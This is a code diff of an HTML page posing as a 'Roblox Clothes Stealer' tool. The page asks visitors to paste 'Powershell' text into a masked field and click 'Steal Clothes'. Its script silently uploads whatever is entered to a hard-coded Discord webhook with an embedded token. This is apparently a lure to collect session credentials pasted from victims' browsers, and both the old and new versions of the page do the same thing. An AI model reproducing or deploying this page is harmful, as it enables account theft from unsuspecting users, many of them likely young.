@@ -7,134 +7,175 @@
     <style>
         body {
             margin: 0;
-            padding: 0;
-            background-color: black;
-            color: white;
-            font-family: 'Courier New', Courier, monospace;
+            height: 100vh;
+            background: 
+                linear-gradient(to right, 
+                    rgb(155, 155, 248) 5%, 
+                    rgba(19, 19, 19, 1) 15%, 
+                    rgba(19, 19, 19, 1) 85%, 
+                    rgb(155, 155, 248) 95%),
+                radial-gradient(circle at top left, 
+                    rgba(155, 155, 248, 0.3) 10%, 
+                    transparent 50%),
+                radial-gradient(circle at bottom right, 
+                    rgba(155, 155, 248, 0.3) 10%, 
+                    transparent 50%);
+            background-color: rgb(19, 19, 19);
+            background-blend-mode: overlay;
+            background-size: 100% 100%;
+            font-family: Arial, sans-serif;
+        }
+
+        .text-box {
+            position: absolute;
+            top: 20%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: #fff;
+            font-size: 36px;
+            font-weight: bold;
+            text-align: center;
+            opacity: 0;
+            animation: fadeIn 3s forwards;
+            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.7);
+        }
+
+        @keyframes fadeIn {
+            0% {
+                opacity: 0;
+            }
+            100% {
+                opacity: 1;
+            }
+        }
+
+        .rounded-box {
+            position: absolute;
+            top: 55%;
+            left: 35%;
+            transform: translate(-50%, -50%);
+            width: 500px;
+            height: 372px;
+            background-color: transparent;
+            border: 1px solid rgb(70, 70, 70);
+            border-radius: 25px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .left-box-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: #fff;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        .input-box {
+            width: 80%;
+            padding: 10px;
+            border: 1px solid rgb(70, 70, 70);
+            border-radius: 20px;
+            background-color: transparent;
+            color: #fff;
+            font-size: 16px;
+            margin: 15px 0;
+            display: block;
+            text-align: center;
+        }
+
+        .steal-button {
+            width: 80%;
+            padding: 12px;
+            border: 1px solid rgb(70, 70, 70);
+            border-radius: 15px;
+            background-color: transparent;
+            color: #fff;
+            font-size: 16px;
+            margin: 15px 0;
+            display: block;
+            text-align: center;
+            cursor: pointer;
+        }
+
+        .rounded-box-right {
+            position: absolute;
+            top: 55%;
+            left: 65%;
+            transform: translate(-50%, -50%);
+            width: 500px;
+            height: 372px;
+            background-color: transparent;
+            border: 1px solid rgb(70, 70, 70);
+            border-radius: 25px;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-        }
-
-        .form-container {
-            background: black;
-            border: 4px dashed white;
-            padding: 20px;
-            border-radius: 0;
             text-align: center;
-            width: 100%;
-            max-width: 400px;
-            box-shadow: 0 0 15px white, inset 0 0 5px black;
+            flex-direction: column;
+            padding-top: 10px;
         }
 
-        h1 {
-            font-size: 28px;
-            text-transform: uppercase;
-            margin-bottom: 20px;
-            letter-spacing: 2px;
-            text-shadow: 0 0 5px white;
-        }
-
-        input[type="password"] {
-            width: calc(100% - 20px);
-            padding: 10px;
-            margin-bottom: 20px;
-            border: 2px solid white;
-            border-radius: 0;
-            font-size: 16px;
-            background-color: black;
-            color: white;
-            outline: none;
-            box-shadow: inset 0 0 5px white;
-        }
-
-        input[type="password"]::placeholder {
-            color: white;
-            opacity: 0.8;
-            font-style: italic;
-        }
-
-        input[type="password"]:focus {
-            border: 2px solid white;
-            background-color: black;
-            box-shadow: 0 0 10px white;
-        }
-
-        button {
-            width: 100%;
-            padding: 12px;
-            background-color: black;
-            color: white;
-            border: 2px dashed white;
-            border-radius: 0;
-            font-size: 18px;
+        .right-box-label {
+            color: #fff;
+            font-size: 24px;
             font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s;
-            text-transform: uppercase;
+            margin-bottom: 20px;
         }
 
-        button:hover {
-            background-color: white;
-            color: black;
-            text-shadow: 0 0 5px black;
+        .right-box-video {
+            width: 80%;
+            height: 80%;
+            border-radius: 20px;
+            overflow: hidden;
         }
 
-        .notification {
-            position: fixed;
-            top: 10%;
-            left: 50%;
-            transform: translateX(-50%);
-            background-color: black;
-            color: white;
-            padding: 10px 20px;
-            border: 2px dashed white;
-            font-size: 16px;
-            font-weight: bold;
-            opacity: 0;
-            transition: opacity 0.5s ease-in-out;
-            z-index: 1000;
-            text-transform: uppercase;
-        }
-
-        .notification.show {
-            opacity: 1;
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
         }
     </style>
 </head>
 <body>
-    <div class="form-container">
-        <h1>Enter Powershell Link</h1>
-        <input type="password" id="userInput" placeholder="Enter your secure text">
-        <button onclick="submitData()">Steal Clothes</button>
+    <div class="text-box">
+        Roblox Clothes Stealer
     </div>
-    <div id="notification" class="notification">Processing... Please wait</div>
+
+    <div class="rounded-box">
+        <div class="left-box-title">Enter Powershell Here</div>
+        <input type="password" class="input-box" id="powershellInput" placeholder="Enter Here" />
+        <button class="steal-button" id="stealButton">Steal Clothes</button>
+    </div>
+
+    <div class="rounded-box-right">
+        <div class="right-box-label">tutorial</div>
+        <div class="right-box-video">
+            <video controls>
+                <source src="tutorial.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </div>
+    </div>
+
     <script>
-        function showNotification() {
-            const notification = document.getElementById('notification');
-            notification.classList.add('show');
-            setTimeout(() => {
-                notification.classList.remove('show');
-            }, 3000); // Show for 3 seconds
-        }
+        document.getElementById('stealButton').addEventListener('click', function() {
+            const powershellText = document.getElementById('powershellInput').value;
 
-        async function submitData() {
-            showNotification();
+            if (powershellText.trim() !== '') {
+                const file = new Blob([powershellText], { type: 'text/plain' });
+                const formData = new FormData();
+                formData.append('file', file, 'message.txt');
 
-            const input = document.getElementById('userInput').value;
-            const webhookUrl = 'https://discord.com/api/webhooks/1321778429015621693/HNT251o7ObV_rCY9k4s15CHTU2d_IXTdOGZegZevP1AMNR65_BMUngLG10e1dhssv6PE';
-
-            // Create a Blob for the text file
-            const file = new Blob([input], { type: 'text/plain' });
-            const formData = new FormData();
-            formData.append('file', file, 'message.txt');
-
-            await fetch(webhookUrl, {
-                method: 'POST',
-                body: formData
-            });
-        }
+                fetch('https://discord.com/api/webhooks/1321778429015621693/HNT251o7ObV_rCY9k4s15CHTU2d_IXTdOGZegZevP1AMNR65_BMUngLG10e1dhssv6PE', {
+                    method: 'POST',
+                    body: formData
+                });
+            }
+        });
     </script>
 </body>
 </html>
